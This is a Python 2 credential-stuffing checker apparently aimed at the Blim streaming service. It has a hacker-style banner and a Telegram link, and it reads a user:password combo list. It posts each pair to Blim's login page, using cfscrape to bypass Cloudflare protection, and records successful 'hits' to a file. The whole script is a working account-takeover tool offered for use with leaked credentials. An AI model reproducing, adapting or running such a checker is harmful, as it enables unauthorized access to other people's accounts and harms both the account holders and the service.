#!/bin/env python
#! -*- Encoding: UTF-8 -*-
import sys, os, colorama, cfscrape
import requests as reqs
from time import sleep
from bs4 import BeautifulSoup
from colorama import Fore,Style,Back
def tests_pyver():
    if sys.version[:3] == "2.7" or "2" in sys.version[:3]:
        pass # Good
    elif "3" in sys.version[:3]:
        print("Python3 not supported.")
    else:
        print("Your python2 version is so old.")

banner = """
██████╗ ██╗     ██╗███╗   ███╗ ██████╗██╗  ██╗██╗  ██╗
██╔══██╗██║     ██║████╗ ████║██╔════╝██║  ██║██║ ██╔╝
██████╔╝██║     ██║██╔████╔██║██║     ███████║█████╔╝ 
██╔══██╗██║     ██║██║╚██╔╝██║██║     ██╔══██║██╔═██╗ 
██████╔╝███████╗██║██║ ╚═╝ ██║╚██████╗██║  ██║██║  ██╗
╚═════╝ ╚══════╝╚═╝╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝
 \t\033[0m By: \033[1;32mMr-Z3r0 \033[1;33mMore in: \033[1;34mhttps://t.me/S0ZS78\033[1;35m
 =======================================================
"""
def check(user, passw, *args):
 session = cfscrape.create_scraper()
 login_page = "https://www.blim.com/account/login"
 #csrftok = login_soup.find(id='login_form__token')['value']
 params = {'username': user,
 'password': passw,
 'mso': '1',
 'rember': '0'
 }
 source = reqs.post(login_page, data=params)
 if "incorrectos" in source.text:
    print("Invalid [{}:{}]".format(user, passw))
 else:
   print('Hit [{}:{}]'.format(user, passw))
   f = open("Hits.txt", 'w+')
   f.write(user+":"+passw)
def main():
 print(Fore.RED + banner + Style.RESET_ALL)
 combolist = raw_input("combo >> ")
 with open(combolist) as s:
    for line in s:
      users, passwords = line.split(':')
      check(users.strip(), passwords.strip())
 """except:
  print("Error! file doesn't exists")
  """
def control():
 tests_pyver()
 main()
 
if __name__ == "__main__":
  try:
    control()
  except (KeyboardInterrupt, SystemExit) as Err:
    pass